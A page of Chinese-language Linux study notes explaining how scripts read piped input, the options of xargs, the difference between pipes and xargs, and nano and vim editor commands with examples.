#目录下面有:test,testsh文件,test1.sh不存在,因此将ls命令错误输出输入到err.txt正确输出,还会通过管道发送到grep命令。
$ ls test.sh test1.sh testsh.sh &>err.txt | grep 'test'
# 这次打印结果是空,&代表正确与错误输出都输入给err.txt,通过管道继续往下面传递数据为空,所以没有什么显示的
# 同样">"输出重定向符,优先级也是先解析,当一个命令有这个字符,它就会与左边命令标准输出绑定。准备好了这些,就等待命令执行输出数据,它就开始接收

</pre>【 Linux如何编程获取管道连接符左侧传递过来的数据 】<textarea># seq -s "+" 10                            # 1+2+3+4+5+6+7+8+9+10
# seq -s "+" 10 | bc                       # 55
$ seq -s " + " 10 | xargs expr             # 55
$ seq 10 | awk '{r+=$0}END{print r}'       # 55
$ echo $((`seq -s "+" 10`))               # 55
$ seq -s " + " 10 | read;echo $(($REPLY)   # 0
$ seq -s " + " 10 | echo $(($*)            # 0

方法:
$ cat tmp.calc
#!/bin/bash
echo $(($*)

$ seq -s " + " 10 | xargs bash tmp.calc   # 55

方法:
$ cat << EOF > tmp.calc
#!/bin/bash
read
echo read内容:$REPLY
echo 脚本参数:$*
echo $(($REPLY)
EOF

$ seq -s " + " 10 | bash tmp.calc
read内容:1 + 2 + 3 + 4 + 5 + 6 + 7 + 8 + 9 + 10
脚本参数:
55

方法:
$ cat tmp.calc
#!/bin/bash
sum=0
while read arg
do
  #echo $arg
  sum=`expr $sum + $arg`
done
echo $sum

$ seq 10 | bash tmp.calc
55

拓展:
# 以通过read来读取
read LINE
while [[ ! -z $LINE ]]
do
    read LINE
done

拓展:
# 使用 read
while read file; do
  echo $file
done

一行的版本是:ls | while read filename; do echo $filename; done

拓展:
# 使用cat
#!/bin/bash
cat
或者放入subshell,就可以随便在需要的地方使用了

#!/bin/bash
echo $(cat)

</textarea>

<h4>xargs命令</h4><pre>
xargs命令是给其他命令传递参数的一个过滤器,也是组合多个命令的一个工具,关键是由于很多命令不支持|管道来传递参数
擅长将标准输入数据转换成命令行参数,xargs能够处理管道或读入stdin并将其以空白字符作为分隔符分隔成特定命令的命令参数arguments

xargs也可以将单行或多行文本输入转换为其他格式,例如多行变单行,单行变多行,xargs是构建单行命令的重要组件之一
xargs的默认命令是echo,默认定界符是空格。这意味着通过管道传递给xargs的输入将会包含换行和空白,不过通过xargs的处理,换行和空白将被空格取代

</pre><pre>
【 -n num参数 】
-n num 后面加次数,表示命令在执行的时候一次用的argument的个数,默认是用所有的
xargs用作替换工具,读取输入数据重新格式化后输出
cat test.txt                            // 输出多行文件
cat test.txt|xargs                      // 多行输入单行输出
cat test.txt | xargs -n3                // -n选项多行输出,每行3个单词
echo "nameXnameXnameXname" | xargs -dX  // -d选项可以自定义一个定界符,将字符串中的X输出为空格

</pre>-n参数可以设置命令每次执行时调用的参数的个数<textarea># cat arg.txt
arg1
arg2
arg3
arg4
arg5

# cat ddd.sh
#!/bin/sh
echo $*'#';

使用管道测试xargs:
# cat arg.txt | xargs sh ddd.sh
arg1 arg2 arg3 arg4 arg5#

# cat arg.txt | xargs -n 1 sh ddd.sh
arg1#
arg2#
arg3#
arg4#
arg5#

</textarea><textarea>$ seq -s " + " 5 | xargs bash study.sh
1 + 2 + 3 + 4 + 5#
$ seq -s " + " 5 | xargs -n 1 bash study.sh
1#
+#
2#
+#
3#
+#
4#
+#
5#

</textarea><pre>
【 -0参数 】
因为是以空白字符作为分隔,所以如果有一些文件名或者是其他意义的名词内含有空白字符的时候,xargs可能就会误判了,如果需要处理特殊字符,需要使用-0参数进行处理

xargs -0将\0(ASCII 空字符 null)作为定界符。

$ echo "// "|xargs echo
//
$ echo "// "|xargs -0 echo
//
         # 空行

【 -a file参数 】
-a file从文件中读入作为sdtin

$ cat 1.txt
aaa  bbb ccc ddd
a    b
$ xargs -a 1.txt echo
aaa bbb ccc ddd a b

【 -e flag参数 】
-e flag,有的时候可能会是-E,flag必须是一个以空格分隔的标志,当xargs分析到含有flag这个标志的时候就停止

$ xargs -E 'ddd' -a 1.txt echo
aaa bbb ccc
$ cat 1.txt |xargs -E 'ddd' echo
aaa bbb ccc

【 -p参数 】
-p操作具有可交互性,每次执行comand都交互式提示用户选择,当每次执行一个argument的时候询问一次用户
$ cat 1.txt |xargs -p echo
echo aaa bbb ccc ddd a b ?...y
aaa bbb ccc ddd a b
$ cat 1.txt |xargs -p echo
echo aaa bbb ccc ddd a b ?...n

【 -t参数 】
-t表示先打印命令,然后再执行。
$ cat 1.txt |xargs -t echo
echo aaa bbb ccc ddd a b
aaa bbb ccc ddd a b

【 -i或-I参数 】
-i或-I,将xargs的每项名称,一般是一行一行赋值给{},可以用{}代替

$ ls *.sh|xargs -i echo {}.bak       # －i 是否指定替换字符-可选
download_image.sh.bak
img_downloader.sh.bak
study.sh.bak

$ ls *.sh|xargs -I {} echo {}.bak    # -I 必须指定替换字符

【 -r参数 】
-r  no-run-if-empty 如果没有要处理的参数传递给xargs,xargs默认是带空参数运行一次;如果希望无参数时停止xargs直接退出,使用-r选项即可,可防止xargs后面命令带空参数运行报错。

$ echo ""|xargs -t mv
mv
mv: missing file operand
Try `mv --help' for more information.
$ echo ""|xargs -t -r mv         #直接退出

【 -s num参数 】
-s num xargs后面那个命令的最大命令行字符数(含空格),num包括命令如echo的字符数

$ cat 1.txt
aaa  bbb ccc ddd
a    b

$ cat 1.txt |xargs -t -s 9 echo
echo aaa
aaa
echo bbb
bbb
echo ccc
ccc
echo ddd
ddd
echo a b
a b
$ cat 1.txt |xargs -t -s 4 echo
xargs: cannot fit single argument within argument list size limit
$ cat 1.txt |xargs -t -s 8 echo
xargs: argument line too long

$ cat 1.txt |xargs -s 9 echo
aaa
bbb
ccc
ddd
a b
$ cat 1.txt |xargs -s 4 echo
xargs: can not fit single argument within argument list size limit      #length(echo)=4
$ cat 1.txt |xargs -s 8 echo
xargs: argument line too long      #length(echo)=4,length(aaa)=3,length(null)=1,total_length=8

【 -L参数 】
-L num,从标准输入一次读取num行送给Command命令,-l和-L功能一样

$ cat 1.txt |xargs -t -L 4 echo
echo aaa bbb ccc ddd a b
aaa bbb ccc ddd a b
$ cat 1.txt |xargs -t -L 1 echo
echo aaa bbb ccc ddd
aaa bbb ccc ddd
echo a b
a b

【 -d delim 】
-d delim 分隔符,默认的xargs分隔符是回车,argument的分隔符是空格,这里修改的是xargs的分隔符

$ cat /etc/passwd | xargs -d :

$ cat 1.txt
aaa@ bbb ccc@ ddd
a b
$ cat 1.txt |xargs  -d '@' echo
aaa  bbb ccc  ddd
a b

【 -x参数 】
-x exit的意思
如果有任何Command行大于-s Size标志指定的字节数,停止运行xargs命令,-L -I -n默认打开-x参数,主要是配合-s使用

【 -p参数 】
-P 修改最大的进程数,默认是1,为0时候为as many as it can 。

【 读取stdin,将格式化后的参数传递给命令 】
假设一个命令为 sk.sh 和一个保存参数的文件arg.txt:
#!/bin/bash
#sk.sh命令内容,打印出所有参数。
echo $*

arg.txt文件内容:
aaa
bbb
ccc

xargs的一个选项-I,使用-I指定一个替换字符串{},这个字符串在xargs扩展时会被替换掉,当-I与xargs结合使用,每一个参数命令都会被执行一次:
cat arg.txt | xargs -I {} ./sk.sh -p {} -l
-p aaa -l
-p bbb -l
-p ccc -l

复制所有图片文件到 /data/images 目录下:
ls *.jpg | xargs -n1 -I cp {} /data/images

【 xargs结合find使用 】
在使用find命令的-exec选项处理匹配到的文件时,find命令将所有匹配到的文件一起传递给exec执行。
有些系统对能够传递给exec的命令长度有限制,在find命令运行几分钟之后就会出现溢出错误。错误信息通常是"参数列太长"或"参数列溢出"。
这就是xargs命令的用处所在,特别是与find命令一起使用。find命令把匹配到的文件传递给xargs命令,而xargs命令每次只获取一部分文件而不是全部,不像-exec选项那样。这样它可以先处理最先获取的一部分文件,然后是下一批,并如此继续下去。

在有些系统中,使用-exec选项会为处理每一个匹配到的文件而发起一个相应的进程,并非将匹配到的文件全部作为参数一次执行;这样在有些情况下就会出现进程过多,系统性能下降的问题,因而效率不高;而使用xargs命令则只有一个进程。另外,在使用xargs命令时,究竟是一次获取所有的参数,还是分批取得参数,以及每一次获取参数的数目 都会根据该命令的选项及系统内核中相应的可调参数来确定。

用rm删除太多的文件时候,可能得到一个错误信息:/bin/rm Argument list too long. 用xargs去避免这个问题:
find . -type f -name "*.log" -print0 | xargs -0 rm -f

xargs -0将\0(ASCII 空字符 null)作为定界符。

统计一个源代码目录中所有php文件的行数:
find . -type f -name "*.php" -print0 | xargs -0 wc -l

查找所有的jpg文件并压缩:
find . -type f -name "*.jpg" -print | xargs tar -czvf images.tar.gz

假如有一个文件包含了很多希望下载的URL,能够使用xargs下载所有链接:
cat url-list.txt | xargs wget -c

在当前目录下查找所有用户具有读、写和执行权限的文件,并收回相应的写权限:
$ find . -perm -7 -print | xargs chmod o-w

查找系统中的每一个普通文件,然后使用xargs命令来测试它们分别属于哪类文件
$ find . -type f -print | xargs file

【 pipe和xargs的区别 】
管道是实现"将前面的标准输出作为后面的标准输入"
xargs是实现"将标准输入作为命令的参数"

echo "--help"|cat             # 打印--help字符串
echo "--help"|xargs cat       # 查看cat命令的帮助信息

如果直接在命令行输入cat而不输入其余的任何东西,这时候的cat会等待标准输入,因此这时候可以通过键盘输入并按回车来让cat读取输入,cat会原样返回。而如果输入--help,那么cat程序会在标准输出上打印自己的帮助文档。也就是说,管道符 | 传递给程序的不是简单地在程序名后面输入的参数,它们会被程序内部的读取功能如scanf和gets等接收,而xargs则是将内容作为普通的参数传递给程序,相当于手写了cat --help

总结:
管道符后不加xargs相当于先将xargs后面的命令回车执行一下再从键盘里输入管道符前面命令执行的结果内容
加上xargs相当于直接从键盘输入管道符前面命令执行的结果内容再回车
再总结一下,就是回车的先后顺序不太一样

管道是把一个命令的输出传递给另一个命令作为输入,比如:command1 | command2,但command2仅仅把输出的内容作为输入参数。find . -name "install.log" -print打印出的是install.log这个字符串,如果仅仅使用管道,那么command2能够使用的仅仅是install.log这个字符串,不能把它当作文件来进行处理。
xargs就是为了能够对find搜索到的文件进行操作而编写的。它能把管道传来的字符串当作文件交给其后的命令执行。

$find . -name "install.log" -print | cat        # 显示从管道传来的内容,仅仅作为字符串来处理,输出./install.log
$find . -name "install.log" -print | xargs cat  # # 将管道传来的内容作为文件,交给cat执行,该命令执行的是如果存在install.log,那么就打印出这个文件的内容,输出aaaaaa

</pre>
</div>

<div id="vim">
<h3>Linux vi/vim</h3><pre>
cat > 2.txt(用定向符创建新文件,填写内容后,按ctrl+d保存内容,可直接ctrl+C退出)
cat >> 2.txt

select-editor选择默认编辑器
/usr/bin/vim.basic

【 nano 】
nano是一个简单实用的文本编辑器
$ nano  filename
若文件不存在则新打开一个文件,若退出时保存则创建该文件
编辑完后ctrl + X提示是否保存按y确定保存即可
在使用过程中可用 ctrl + G 获取帮助
复制一整行:Alt+6
剪贴一整行:Ctrl+K
粘贴:Ctrl+U
搜索:Ctrl+W
上一页:Ctrl+Y
下一页:Ctrl+V
保存:Ctrl+O
退出:Ctrl+X

</pre>

<h4>vi/vim</h4><pre>
所有的Unix系统都会内建vi文本编辑器,目前使用比较多的是vim编辑器,vim是vi的升级版
vim具有程序编辑的能力,可以主动的以字体颜色辨别语法的正确性,方便程序设计

vim是一款功能强大、支持各种插件、配置极为灵活的编辑器,且支持多种主流OS(linux、Unix、mac、windows),可用来各种编程预言的coding和文件编辑,用习惯了vim会体会到纯键盘编辑的高效和便捷

几乎所有流行的编辑器和IDE工具都支持vim插件

vim分为三种模式:命令模式(Command mode),输入模式(Insert mode)和底线命令模式(Last line mode)

【 帮助文档 】
vi沒有on-line help,但vim及elvis有丰富的说明系统,vim沿用传统tag的方式来找主题
命令帮助的格式为:第一行指明怎么使用那个命令,然后是缩进的一段解释这个命令的作用,然后是进一步的信息

:h(elp)或F1 打开帮助文件help.txt
:q 结束说明档,回到原编辑文档
:h name或:help name 调出name指令的说明文档,name记不清楚时別忘了Tab补全。
在vim的说明档中遇有两个|包围的主题,把游标移到上面就可以使用Ctrl+]来调出这个主题的说明,Ctrl+T可以回到原说明,mouse按两下也是可以调出说明

:ver
显示版本、编译资讯,编译时加入的参数也会显示出来,其中+表示有此功能,-表示无此功能

【 启动Vim 】
vim -c cmd file: 在打开文件前先执行指定的命令
vim -r file: 恢复上次异常退出的文件
vim -R file: 以只读的方式打开文件,但可以强制保存
vim -M file: 以只读的方式打开文件,不可以强制保存
vim -y num file: 将编辑窗口的大小设为num行
vim + file: 从文件的末尾开始
vim +num file: 从第num行开始
vim +/string file: 打开file,并将光标停留在第一个找到的string上
vim --remote file: 用已有的vim进程打开指定的文件。如果不想启用多个vim会话,这个很有用。但要注意, 如果用vim,会寻找名叫VIM的服务器;如果已经有一个gvim在运行了,可以用gvim --remote file在已有的gvim中打开文件。

【 叫档、存档 】
vim打开文件的方法很多,又可以多档编辑,各编辑中的档案还可以互通訊息,档案可以加密

开档,目标文件不存在时会打开一个新建的文件,文件名可使用TAB键补全
vim filename
vim a.txt b.txt: 指令一次打开多个文件,使用buffer的命令切换
vim -o a.txt b.txt: 在水平分割的多个窗口中编辑多个文件。
vim -O a.txt b.txt: 在垂直分割的多个窗口中编辑多个文件。
vim + filename: 这样开档后游标会落在档案最后一行的行尾,方便继续编辑
vim +n filename: 游标会落在第n行的行首。
vim +/string filename: /是寻找指令,这样进入档案后游标会落在第一个找到的string上,还可按n继续找string,string可用regexp表示

多档编辑的两种情形
一种是在进入vim前所用的参数就是多个档(argument list),另一种情形是进入vim后另外再开其它的档(buffer list),不过都可以统称为buffer。

argument list切换
:args 显示文件列表。
:next(:n)编辑下一个文件。
:2n 编辑下2个文件。
:previous或:N编辑上一个文件。
:wnext,保存当前文件并编辑下一个文件。
:wprevious,保存当前文件并编辑上一个文件。
:n a.txt b.txt或:args a.txt b.txt指定新的文件列表。

:b 文件名或編号
切换文件。在:ls中就会出示各文件的編号,这个編号在未离开vim前是不会变的
使用:ls列举当前缓冲区,然后使用:b n来跳转到第n个缓冲区,或使用:bpre :bnext :bfirst :blast :b test.txt可使用tab补全
:bn -- 下一个缓冲区。
:bp -- 上一个缓冲区。
:bl -- 最后一个缓冲区。
:b[n]或:[n]b -- 切换到第n个缓冲区。
:nbw(ipeout) -- 彻底删除第n个缓冲区。
:nbd(elete) -- 删除第n个缓冲区,并未真正删除,还在unlisted列表中。
:ba[ll] -- 把所有的缓冲区在当前页中打开,每个缓冲区占一个窗口。

:bd(elete)
在未离开vim前是不会移除的,可使用这个指令移除。vim是叫用时才会载入的,因此这些buffers並不是像cache一般要占内存的。

:e filename
edit,在进入vim后不离开vim的情形下再开其它档案,如果对当前文件的修改未保存,vim默认是不让随便离开的。

:e! filename
这样也是会开档,但会放弃目前编辑档案的改变

:e+file -- 开始新的文件,并从文件尾开始编辑。
:e+n file -- 开始新的文件,并从第n行开始编辑。
:enew --编译一个未命名的新文档。(CTRL-W n)
:e -- 重新加载当前文档。
:e! -- 重新加载当前文档,并丢弃已做的改动。

:e# 或 Ctrl-^
编辑前一个档案,两档互相编辑时相当好用,这种用法argument list或buffer list档案皆可使用

:files 或 :buffers 或 :ls
列出目前buffer中的所有档案即vim所打开的所有文件,在buffers中减号表示这个buffer並未载入,加号+表示这个buffer已經修改過了。

:f 或 Ctrl-g
显示目前编辑的文件名、是否经过修改及目前游标所在之位置。

:f filename
改变编辑中的文件名,这是再保存则相当于另存为

gf
打开游标所在的word为名的文件,不存在则新建文件

:r filename
在游标所在处插入一个文件內容。(read)
:35 r filename
將文件插入至35行之后。

离开
:w [filename] 另存为,不加filename就是保存文档。(write)
:saveas newfilename 另存为
:n1,n2 w [filename] 将第n1行到第n2行的数据储存为新的文件
:w!   强制保存只读文件,是否写入成功与所拥有的文件权限有关
:q    离开vim,如文件有修改而沒存档会警告且无法离开。(quit)
:q!   舍弃所有修改,強迫离开。
:qa或:qa!  多档编辑时整个离开vim,:q及:q!是对目前编辑中的档案作用,如果多档编辑的情形並不会离开vim
:wq   存档后离开,纵使档案未曾修改也是会再存一次档。
:wq!  文件强制保存后离开vim
:x    也是存档后离开,但如果档案沒有修改则不会做存档的动作。
ZZ    同:x
Zq    不保存退出,q表示放弃

:指令! 強迫中止目前正在编辑的动作,而去执行所下的指令,如:q!强制退出

:browse e -- 会打开一个文件浏览器让你选择要编辑的文件。 如果是终端中,则会打开netrw的文件浏览窗口; 如果是gvim,则会打开一个图形界面的浏览窗口。 实际上:browse后可以跟任何编辑文档的命令,如sp等。 用browse打开的起始目录可以由browsedir来设置:
:set browsedir=last -- 用上次访问过的目录(默认);
:set browsedir=buffer -- 用当前文件所在目录;
:set browsedir=current -- 用当前工作目录;
:Sex -- 水平分割一个窗口,浏览文件系统;
:Vex -- 垂直分割一个窗口,浏览文件系统;

【 多文件操作 】
buffer指打开的一个文件的内存缓冲区
vim打开一个文件后会加载文件内容到缓冲区,之后的修改但是针对内存中的缓冲区,并不会直接直接保存到文件,直到执行:w才会把修改的内容写入文件

window窗口是buffer可视化的分割区域
一个缓冲区可分割成多个窗口,每个窗口也可以通过:e filename打开不同的缓冲区,每个窗口可无限制分割
凡视窗操作的按键都是由Ctrl-w来开头的,w就是window

ctrl+w +s / :sp 水平分割
ctrl+w +v / :vs 垂直分割
ctrl+w +w 窗口间循环切换,先按ctrl+w再按w
ctrl+w +h 切换到左边的窗口
ctrl+w +j 切换到下边的窗口
ctrl+w +k 切换到上边的窗口
ctrl+w +l 切换到右边的窗口

ctrl+w +H 移动窗口到左边
ctrl+w +J 移动窗口到下边
ctrl+w +K 移动窗口到上边
ctrl+w +L 移动窗口到右边

ctrl+w + --当前窗口增高一行。也可以用n增高n行。
ctrl+w - --当前窗口减小一行。也可以用n减小n行。
ctrl+w _ --当前窗口高度扩展到尽可能的大。也可以用n设定行数。
ctrl+w | --当前窗口尽可能的宽。也可以用n设定列数。
:resize n -- 当前窗口n行高。
ctrl+w = -- 所有窗口同样宽高,默认
n + ctrl+w _ 活动窗口高度设为n行
n + ctrl+w | 活动窗口宽度设为n行
ctrl+w < --当前窗口减少一列。也可以用n减少n列。
ctrl+w > --当前窗口增宽一列。也可以用n增宽n列。

Ctrl-w n  即:new,开一空的新视窗,这在vim会开在原视窗上半方,也就是视窗一分为二
Ctrl-w f  开一新视窗,並编辑游标所在处之word为文件名的档案。
Ctrl-w q  即:q 结束分割出来的视窗,关闭当前游标所在的视窗
Ctrl-w o  即:only! 使游标所在之视窗,成为目前唯一显示的视窗,其它视窗会隐藏起来。
[ctrl]+w+向下方向键  先按[ctrl]不放再按下w后放开所有按键,最后再按向下方向键,游标就会移动到下方的视窗
[ctrl]+w+向上方向键  按键方法同上,游标会移动到上方的视窗

修改同一buffer的多个窗口同时修改即同步显示

标签页tab可以组织窗口为一个工作区,将窗口分组,tab是可容纳一系列窗口的容器,:h tabpage
vim的tab和其他编辑器不太一样,可以想象成lunix的虚拟桌面
比如一个tab全用来编辑python文件,一个tab全是HTML文件

vim -p files: 打开多个文件,每个文件占用一个标签页
:tabe(dit), tabnew -- 如果加文件名就在新的标签中打开这个文件,否则打开一个空缓冲区
ctrl+w +T 把当前窗口移到一个新的标签页
:tabs -- 列出所有的标签页和它们包含的窗口
:tabc[lose] 关闭当前标签页及其中所有窗口
:tabo[nly] 只保留当前标签页,关闭其他
:tabn[ext] 或gt: 切换到下一个标签页
:tabn[ext] n 或ngt: 切换到编号为n的标签页
:tabp[revious] 或gT: 切换到上一个标签页
:tab split -- 将当前缓冲区的内容在新页签中打开
:tabm[ove] [N] -- 移动标签页,移动到第N个标签页之后,如tabm 0当前标签页就会变成第一个标签页

分屏编辑
vim -o file1 file2:水平分割窗口,同时打开file1和file2
vim -O file1 file2:垂直分割窗口,同时打开file1和file2

水平分割
:split(:sp) -- 把当前窗水平分割成两个窗口。(CTRL-W s或CTRL-W CTRL-S) 注意如果在终端下,CTRL-S可能会冻结终端,请按CTRL-Q继续。
:split filename -- 水平分割窗口,并在新窗口中显示另一个文件。
:nsplit(:nsp) -- 水平分割出一个n行高的窗口。
:[N]new -- 水平分割出一个N行高的窗口,并编辑一个新文件。 (CTRL-W n或CTRL-W CTRL-N)
ctrl+w f --水平分割出一个窗口,并在新窗口打开名称为光标所在词的文件 。
C-w C-^ -- 水平分割一个窗口,打开刚才编辑的文件。

垂直分割
:vsplit(:vsp) -- 把当前窗口分割成水平分布的两个窗口。 (CTRL-W v或CTRL CTRL-V)
:[N]vne[w] -- 垂直分割出一个新窗口。
:vertical 水平分割的命令: 相应的垂直分割。

关闭子窗口
:qall -- 关闭所有窗口,退出vim。
:wall -- 保存所有修改过的窗口。
:only -- 只保留当前窗口,关闭其它窗口。(CTRL-W o)
:close -- 关闭当前窗口,CTRL-W c能实现同样的功能。(象:q :x同样工作)

【 快速编辑 】
撤消与重做(normal模式)
:u -- 撤销前一个操作(undo)
[n] u -- 取消一(n)个改动。
:undo 5 -- 撤销5个改变。
:undolist -- 撤销历史。
ctrl + r -- 重做上一个被撤销的操作,重做最后的改动。(redo)
. -- 小数点表示重复前一个操作,只要是编辑动作(dd,dw,r,cw等)都可以重复,移动游标不算,冒号命令也不算
U -- 取消当前行中所有的改动。
:earlier 4m -- 回到4分钟前
:later 55s -- 前进55秒

简单计算器: 在插入模式下输入C-r =,然后输入表达式,就能在光标处得到计算结果
g C-g: 统计全文或统计部分的字数

工作目录
:pwd 显示vim的工作目录
:cd path 改变vim的工作目录
:set autochdir 让vim根据编辑的文件自动切换工作目录

折叠
zf -- 在一个可视区域上创建折叠
zd -- 删除当前行的折叠;
zD -- 删除当前行的折叠;
zfap -- 折叠光标所在的段;
zo -- 打开折叠的文本;
zc -- 收起折叠;
za -- 打开/关闭当前折叠;
zr -- 打开嵌套的折行;
zm -- 收起嵌套的折行;
zR (zO) -- 打开所有折行;
zM (zC) -- 收起所有折行;
zj -- 跳到下一个折叠处;
zk -- 跳到上一个折叠处;
zi -- enable/disable fold;

编译
vim提供了:make来编译程序,默认调用的是make, 如果你当前目录下有makefile,简单地:make即可。
如果没有make程序,可以通过配置makeprg选项来更改make调用的程序。 如果只有一个abc.java文件,可以这样设置:
set makeprg=javac\ abc.java
然后:make即可。如果程序有错,可以通过quickfix窗口查看错误。 不过如果要正确定位错误,需要设置好errorformat,让vim识别错误信息。 如:
:setl efm=%A%f:%l:\ %m,%-Z%p^,%-C%.%#
%f表示文件名,%l表示行号, %m表示错误信息,其它的还不能理解。 请参考 :help errorformat。

编程辅助
gd: 跳转到局部变量的定义处;
gD: 跳转到全局变量的定义处,从当前文件开头开始搜索;
g;: 上一个修改过的地方;
g,: 下一个修改过的地方;
[[: 跳转到上一个函数块开始,需要有单独一行的{。
]]: 跳转到下一个函数块开始,需要有单独一行的{。
[]: 跳转到上一个函数块结束,需要有单独一行的}。
][: 跳转到下一个函数块结束,需要有单独一行的}。
[{: 跳转到当前块开始处;
]}: 跳转到当前块结束处;
[/: 跳转到当前注释块开始处;
]/: 跳转到当前注释块结束处;
%: 不仅能移动到匹配的(),{}或[]上,而且能在#if,#else, #endif之间跳跃。

【 普通模式 Normal mode 】
刚刚启动vim便进入了普通模式。只能下按键指令,不能输入文字,这些指令可能是游标移动的指令,也可能是编辑指令或寻找替換指令
比如按下i并不会输入一个字符,i被当作了一个命令,切换到输入模式。
命令模式只有一些最基本的命令,因此仍要依靠底线命令模式输入更多命令。

使用vim进入普通模式
$ vim runoob.txt  // 使用vi建立test.txt文件

normal模式中按下:wq储存后离开vim
normal模式可用的光标移动、复制粘贴、搜索替换等

以下是常用的几个命令:
i 切换到输入模式以输入字符。
: 切换到底线命令模式,以在最底一行输入命令。
x 删除当前光标所在处的字符。

J  將下一行整行接至本行合并为一行(Joint),使用J时默认会消去本行的EOL,且上下行接縫間会留下一个空白字符,这符合英文習慣,却对中文会造成困扰,使用gJ指令则不留空白字符

r 进入取代模式;只会取代游标所在的那个字符一次
R 进入取代模式;会一直取代游标所在的文字,直到按下[Esc]为止

【 插入模式(编辑模式) Insert mode(i-mode) 】
命令模式下按下i就进入了输入模式,在左下角状态栏中会出现 –INSERT- 或REPLACE的字样,那就是可以输入任意字符的提示
编辑模式时键盘上除了Esc键之外其他的按键都可以视作为一般的输入按钮了,所以可以进行任何的编辑

insert -> normal
ESC / ctrl+c / ctrl+[

normal -> insert
i(insert)、o(open a line below)、a(append)
I(insert before line)、O(open a line above)、A(append after line)
gi 快速跳回到最后一次编辑的地方并进入插入模式

i  光标前插入(insert)
a  光标后插入(append)
o  本行下新开一行来插入(open)
I  在行首(第一个非空白字符处)开始输入文字,要从真正的第一个字符处开始输人文字可使用0i或gI
A  在行尾开始输入文字
O  本行上新开一行来插入

插入分割线:按8再按i,进入插入模式输入=,按esc进入命令模式就会出现8个=,如30i+< esc>就插入了36个+组成的分割线

:r filename在当前位置插入另一个文件的内容。
:[n]r filename在第n行插入另一个文件的内容。
:r !date 在光标处插入当前日期与时间。同理,:r !command可以将其它shell命令的输出插入当前文档

以下命令同样适用于终端输入的命令字符:
ctrl+h 删除上一个字符
ctrl+w 删除上一个单词
ctrl+u 删除当前行

终端输入的操作
ctrl+a 快速移动到开头
ctrl+e 快速移动到尾部
ctrl+b 快速往前移动
ctrl+f 快速往后移动

【 底线命令模式 Ed mode(common-line mode,e-mode) 】
在命令模式下按下:就进入了底线命令模式,按Esc回到c-mode

在底线命令模式中基本的命令:
:wq 保存退出
:q 退出程序,退出当前分屏
:w 保存文件
:vs(vertical) 竖分屏
:sp(split) 横分屏
:% s/foo/bar/g 全局替换foo为bar
按ESC键可随时退出底线命令模式。

命令行模式下的快捷键:
上下方向键:上一条或者下一条命令。如果已经输入了部分命令则找上一条或下一条匹配的命令。
左右方向键:左/右移一个字符。
C-w: 向前删除一个单词。
C-h: 向前删除一个字符,等同于Backspace。
C-u: 从当前位置移动到命令行开头。
C-b: 移动到命令行开头。
C-e: 移动到命令行末尾。
Shift-Left: 左移一个单词。
Shift-Right: 右移一个单词。
@: 重复上一次的冒号命令。
q: 正常模式下,q然后按':',打开命令行历史缓冲区,可以像编辑文件一样编辑命令。
q/和q? 可以打开查找历史记录。

【 Visual(可视)模式 】
Visual模式一般用来块状选择文本,Normal模式下使用v进入visual选择,使用Esc键或Ctrl+c退出
使用v后就可以移动游标,游标走過的地方就会反白选择标示起来。再按一次v就会结束v-mode,用mouse拉出的标示区也是属于这类的标示。
使用V选择行,移动上下键会标示多行,再按一次V就会结束v-mode。
mouse按两次左钮是标示一个word,按三次是整行标示,也是属于此类的标示
使用ctrl+v进行方块旋转,再按一次Ctrl-v就会结束v-mode。

d        刪除标示区內容。
y        复制标示区內容。
p        将之前复制的区块,粘贴在游标所在处
"ay      把标示区內容存于 a 缓冲区中。可以用 "ap 来贴上。
Shift->  标示区內容向右移一个Tab。
Shift-<  标示区內容向左移一个Tab。

:h visual.txt有详细的介紹

【 智能补全 】
补全一个单词、文件名、代码中变量函数名

不是只有Tab键的补全功能,也可以使用上下方向键叫出历史指令,叫出历史指令可用于冒号命令及寻找命令(/)
例如已下了 :!ps aux这个指令,可以按 : 后就直接按向上方向键显示之前执行的命令,直接回车执行

按了Tab键补全后发现不是想要的就继续按

insert模式时Tab补全无效,需要vim的补全功能
1、ctrl+n ctrl+p补全单词
2、ctrl+x ctrl+f补全文件名,如open('./按ctrl+x ctrl+f
3、ctrl+x ctrl+o补全代码,需要开启文件类型检查,安装插件,开启:filetype on检测文件类型,:set filetype回车

CTRL-P补全是向上查找以进行补全
CTRL-N是向下查找以进行补全

普通关键字                      CTRL-n
整行补全                        CTRL-X CTRL-L
根据当前文件里关键字补全         CTRL-X CTRL-N
根据字典补全                    CTRL-X CTRL-K
根据同义词字典补全               CTRL-X CTRL-T
根据头文件内关键字补全           CTRL-X CTRL-I
根据标签补全                    CTRL-X CTRL-]
补全文件名                      CTRL-X CTRL-F
补全宏定义                      CTRL-X CTRL-D
补全vim命令                     CTRL-X CTRL-V
用户自定义补全方式               CTRL-X CTRL-U
拼写建议                        CTRL-X CTRL-S
以副文件名作为语法关键字予以补齐  ctrl+x ctrl+o

自动补全
C-x C-s -- 拼写建议。
C-x C-v -- 补全vim选项和命令。
C-x C-l -- 整行补全。
C-x C-f -- 自动补全文件路径。弹出菜单后,按C-f循环选择,当然也可以按 C-n和C-p。
C-x C-p 和C-x C-n -- 用文档中出现过的单词补全当前的词。 直接按C-p和C-n也可以。
C-x C-o -- 编程时可以补全关键字和函数名啊。
C-x C-i -- 根据头文件内关键字补全。
C-x C-d -- 补全宏定义。
C-x C-n -- 按缓冲区中出现过的关键字补全。 直接按C-n或C-p即可。

当弹出补全菜单后:
C-p 向前切换成员;
C-n 向后切换成员;
C-e 退出下拉菜单,并退回到原来录入的文字;
C-y 退出下拉菜单,并接受当前选项。

【 文本对象 】
通过操作文本对象来修改比值操作单个字符高效,y、d、c、v都可以跟文本对象

[number] command text_object
command: d(delete)、c(change)、y(yank)
text_object: 比如一个单词w、一段句子s、一个段落p

aw:一个词
as:一句
ap:一段
ab:一块,包含在圆括号中的文本和括号

iw: inner word
aw: around word,不但选中当前单词,还包含当前单词之后的空格

iW、aW
is、as
ip、ap

括号匹配
ci', di', yi':修改、剪切或复制'之间的内容并进入插入模式
ca', da', ya':修改、剪切或复制'之间的内容,包含',进入插入模式
ci", di", yi":修改、剪切或复制"之间的内容并进入插入模式
ca", da", ya":修改、剪切或复制"之间的内容,包含",进入插入模式
ci(, di(, yi(:修改、剪切或复制()之间的内容并进入插入模式
ca(, da(, ya(:修改、剪切或复制()之间的内容,包含(),进入插入模式
ci[, di[, yi[:修改、剪切或复制[]之间的内容并进入插入模式
ca[, da[, ya[:修改、剪切或复制[]之间的内容,包含[],进入插入模式
ci{, di{, yi{:修改、剪切或复制{}之间的内容并进入插入模式
ca{, da{, ya{:修改、剪切或复制{}之间的内容,包含{},进入插入模式
